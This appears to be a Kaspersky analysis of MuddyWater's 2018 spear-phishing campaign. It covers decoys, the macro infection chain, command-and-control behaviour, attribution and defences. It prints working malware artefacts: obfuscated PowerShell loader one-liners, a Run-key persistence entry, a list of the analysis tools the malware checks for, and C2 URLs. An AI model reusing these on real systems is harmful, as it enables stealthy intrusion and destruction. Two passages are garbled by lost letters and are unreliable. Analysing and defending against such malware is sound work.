It has focused mainly on governmental targets in Iraq and Saudi Arabia, according\nto past telemetry. However, the group behind MuddyWater has been known to target other countries in the Middle East, Europe and the US.\nWe recently noticed a large amount of spear phishing documents that appear to be targeting government bodies, military entities, telcos and\neducational institutions in Jordan, Turkey, Azerbaijan and Pakistan, in addition to the continuous targeting of Iraq and Saudi Arabia, other\nvictims were also detected in Mali, Austria, Russia, Iran and Bahrain.. These new documents have appeared throughout 2018 and escalated\nfrom May onwards. The attacks are still ongoing.\n\nThe new spear-phishing docs used by MuddyWater rely on social engineering to persuade users to enable macros. The attackers rely on a\nrange of compromised hosts to deliver their attacks. In the advanced stages of this research, we were able not only to observe additional files\nand tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers.\n\nPrevious related research:\n\n[https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1](https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1)\n\n[https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/](https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/)\n\nhttps://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabiagovernment_entity/\n\n[https://www.sekoia.fr/blog/falling-on-muddywater/](https://www.sekoia.fr/blog/falling-on-muddywater/)\n\n## Decoy images by country\n\n### Jordan\n\n\n-----\n\n_The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc)_ _DAMAMAX.doc_\n\n### Turkey\n\n_Turkey’s General Directorate of Security_ _Turkey’s Directorate General of Coastal Safety_\n\n_Turkey’s General Directorate of Security (Onemli Rapor.doc)_ _Turkey’s Ministry of the Interior (Early election.doc)_\n\n### Saudi Arabia\n\n\n-----\n\n_Document signed by the Major General Pilot, commander of the Saudi Royal Air Force_\n\n_KSA King Saud University (KSU)_ _KSA King Saud University (KSU)_\n\n### Azerbaijan\n\n\n-----\n\n_İnkişaf üçün görüş.doc (meeting for development)_\n\n### Iraq\n\n_Iraqi Ministry of Foreign Affairs_ _Government of Iraq, the Treasury of the Council of Ministers_\n\n### Pakistan\n\n\n-----\n\n_ECP.doc_ _National Assembly of Pakistan.doc_\n\n_P.Police.doc_\n\n### Afghanistan\n\n\n-----\n\n_President.doc, E-government of Afghanistan_\n\n## Technical details\n\nBelow is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and\nthen dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives\ncommands supported by the malware.\n\n### The initial infection vector\n\nThe initial infection starts with macro-enabled Office 97-2003 Word files whose macros are usually password-protected to hinder static\nanalysis.\n\n\n-----\n\nMalicious obfuscated VBA code is executed when the macro is first enabled. In some cases, the malicious macro is also executed when the\nuser activates a fake text box.\n\n**The macro payload analysis, dropped files and registry keys**\n\nThe macro payload, which is Base64 encoded, does the following:\n\n1. Drops two or three files into the “ProgramData” folder. The dropped files are either in the root of the “ProgramData” folder or in a\n\nsubdirectory. The file names may vary from one version of the malware to another.\n\n**_\\EventManager.dll_**\n\n**_\\EventManager.logs_**\n\n**_\\WindowsDefenderService.inil_**\n\n1. Adds a registry entry in the current user’s RUN key (HKCU) for later execution when the user next logs in. In some cases, the macro\n\nspawns the malicious payload/process instantly without waiting for the next time the user logs in. The registry keys and executables may\nvary from one version of the malware to another.\n\nName:WindowsDefenderUpdater\n\nType:REG_EXPAND_SZ\n\nData:c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\n\nThe next time the user logs in, the dropped payload will be executed. The executables have been chosen specifically for bypassing allowlisting\nsolutions since they are all from Microsoft and very likely allowlisted. Regardless of the file extensions, the files dropped by the macro are\n**_EITHER INF, SCT and text files OR VBS and text files._**\n\n**Case 1: INF, SCT and text files dropped by the macro**\n\n1. INF is launched via the advpack.dll “LaunchINFSection” function.\n2. INF registers the SCT file (scriptlet file) via scrobj.dll (Microsoft Scriptlet library).\n3. Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell one-liner which finally consumes the text\n\nfile.\n\npowershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne\n$s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]\n($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(”,$d));\n\nPowerShell one-liner\n\n\n-----\n\n_Encoded text file_\n\nExecution flow:\n\n**Case 2: VBS and text files dropped by the macro**\n\nThe VBS file decodes itself and calls mshta.exe, passing on one line of VBScript code to it, which in turn spawns a PowerShell one-liner\nwhich finally consumes the text file (usually Base64-encoded text).\n\npowershell.exe -w 1 -exec Bypass -nologo -noprofile -c\niex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content\nC:\\ProgramData\\ZIPSDK\\ProjectConfManagerNT.ini))));\n\nPowerShell one-liner\n\n_Encoded text file_\n\nExecution flow:\n\n### The PowerShell code\n\n\n-----\n\nWhen PowerShell is invoked whether via WMI, wscript.exe, or mshta.exe, it executes a one-liner PowerShell code (as outlined above) that\nreads the encoded text file dropped in ProgramData and then decodes it. The resulting code has multiple layers of obfuscation.\n\nThe first thing the PowerShell code does is to disable office “Macro Warnings” and “Protected View“. This is to ensure future attacks don’t\nrequire user interaction. It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks.\n\n**_Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted. The_**\nnames are linked to various tools used by malware researchers.\n\n“win32_remote“,”win64_remote64“,”ollydbg“,”ProcessHacker“,”tcpview“,”autoruns“,”autorunsc“,”filemon“,”procmon“,”regmon“,”procexp“,”id\n\nDenylisted process names in the malware\n\nIn some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via\nthe ntdll.dll “NtRaiseHardError” function.\n\n**CnC communication**\n\nA URL is selected at random from a long list of embedded URLs held in an array named $dragon_middle. The selected URL is subsequently\nused for communication with the CnC server. If it can’t send data to the chosen CnC URL, it tries to obtain another random URL from\n$middle_dragon, then sleeps from one to 30 seconds and loops again.\n\n**Victim system reconnaissance**\n\nThe code then tries to obtain the victim’s public IP via “https://api.ipify.org/”.\n\nThe public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the\npreviously chosen URL to register a new victim. This allows the attackers to accept or reject victims depending on their IPs, countries,\ngeolocations, target enterprises, etc. Depending on the response from the attacker’s CnC, the victim is assigned an ID $sysid. This ID is sent\nto the CnC with each request for commands to execute.\n\n**Supported commands**\n\n\n-----\n\n**_up oad, sc ee s ot,_** **_ce, Out oo_**, **_s_**, **_eboot, s utdo_**, c ea ese co a ds a y o o e e s o to a ot e\n\n1. The “screenshot” command takes a screenshot that is saved as a.PNG file in “ProgramData“.\n2. The “Excel” command receives another stage of the PowerShell code, saves it in “c:\\programdata\\a.ps1” and then asks Excel to\n\nexecute this PowerShell script via DDE.\n3. The “Outlook” command receives another stage of the PowerShell code, saves it in “c:\\programdata\\a.ps1” and then asks Outlook via\n\n**_COM, via MSHTA.exe, to execute it._**\n4. The “risk” command receives another stage of the PowerShell code, saves it in “c:\\programdata\\a.ps1” and then asks Explorer.exe via\n\n**_COM interaction to execute it._**\n5. The “upload” command downloads files from the CnC and saves them locally in “C:\\ProgramData“.\n6. The “clean” command destroys the victim’s disk drives C, D, E, F and then reboots.\n7. The “reboot” and “shutdown” commands immediately reboot and shut down the victim’s machine.\n\nIn one version of the malware, the code checks if the “ProgramData” folder has folders or files with the keywords “Kasper“, “Panda“, or\n“ESET“.\n\n## Victimology\n\n\n-----\n\nMost victims of MuddyWater were found in Jordan, Turkey, Iraq, Pakistan, Saudi Arabia, Afghanistan and Azerbaijan. Other victims were also\nrecorded in Russia, Iran, Bahrain, Austria and Mali. The malicious decoy documents used in the attacks suggest they are geopolitically\nmotivated, targeting sensitive personnel and organizations.\n\n## Attacker deception and attribution\n\nThe deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as\nprototypes. Multiple documents used in the attacks also contain embedded paths from their authors’ machines. These paths are embedded by\nOffice under various circumstances, for instance, when somebody adds a binary object (an OLE control, e.g. text box or command button) into\na Word document. The paths discovered are:\n\n- C:\\Users\\leo\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd\n\n- C:\\Users\\poopak\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd\n\n- C:\\Users\\Vendetta\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd\n\n- C:\\Users\\Turk\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd\n\n**Leo, Poopak, Vendetta and Turk are the usernames of those creating the documents or the templates on which they are based. Turk could**\npoint to a person of Turkish origin. Poopak is a Persian girl’s name or might suggest the authors are not entirely happy with “Pak”, which could\nbe short for Pakistan. Leo could be one of the attacker’s names. We also don’t rule out the possibility of false flags, with the attackers using\nrandom usernames to confuse researchers.\n\nIn multiple instances, we have also found Chinese text inside the samples, possibly indicating the reuse of code by the attackers.\n\n无法连接到网址，请等待龙…\n\n无法访问本地计算机寄存器\n\n任务计划程序访问被拒绝\n\nChinese text found in PowerShell code in multiple samples\n\nUnable to connect to the URL, please wait for the dragon…\n\nUnable to access local computer register\n\nTask Scheduler access denied\n\nTranslation of Chinese text\n\n\n-----\n\ne a e a so ot ced t at o so e sa p es, e g 5a **_a_** **_e3b3c a db3 d9e3d83_** **_8_**, t e o e S e code ad o y t ee C C U s,\nwhich leads us to believe that most of the CnC URLs in $dragon_middle found in other samples could actually be ‘noise’ to distract\nresearchers or trigger false positives.\n\nhttp://www.cankayasrc[.]com/style/js/main.php\nhttp://ektamservis[.]com/includes/main.php\nhttp://gtme[.]ae/font-awesome/css/main.php\n\n## Recommendations for organizations\n\nEffective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training,\nallowing an organization to control any activities on their network or suspicious files on user systems.\n\nThe best way to prevent attackers from finding and leveraging security holes, is to eliminate the holes altogether, including those related to\nimproper system configurations or errors in proprietary applications. Organizations are also recommended to implement the following steps for\nan enhanced level of protection at their premises.\n\n1. Use PowerShell Constrained Language Mode as it uses IEX, Add-Type, and New-Object.\n2. Lock PowerShell Execution Policy, must be set to “AllSigned” via GPO.\n3. An allowlisting solution to prevent certain process child-parent execution hierarchies.\n\n## Conclusion\n\nThe MuddyWaters group has carried out a large number of attacks and demonstrated advanced social engineering, in addition to the active\ndevelopment of attacks, infrastructure and the use of new methods and techniques. The attackers are actively improving their toolkit in an\neffort to minimize their exposure to security products and services. Kaspersky Lab expects these types of attacks to intensify in the near future.\n\nIn order to protect your company from malware, Kaspersky Lab researchers recommend implementing the following measures:\n\nEducate generic staff to be able to distinguish malicious behavior like phishing links.\nEducate information security staff to have full configuration, investigative and hunting abilities.\nUse a proven corporate-grade security solution in combination with anti-targeted attack solutions capable of detecting attacks by\nanalyzing network anomalies.\nProvide security staff with access to the latest threat intelligence data, which will arm them with helpful tools for targeted attack\nprevention and discovery, such as indicators of compromise and YARA rules.\nMake sure enterprise-grade patch management processes are well established and executed.\n\nHigh-profile organizations should have elevated levels of cybersecurity, attacks against them are inevitable and are unlikely to ever cease.\n\n### Additional information\n\nIn the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some\nOPSEC mistakes made by the attackers.\n\nFurther details about the attackers’ arsenal, additional indicators of compromise, YARA rules and attribution information is available to\ncustomers of [Kaspersky Intelligence Reporting.
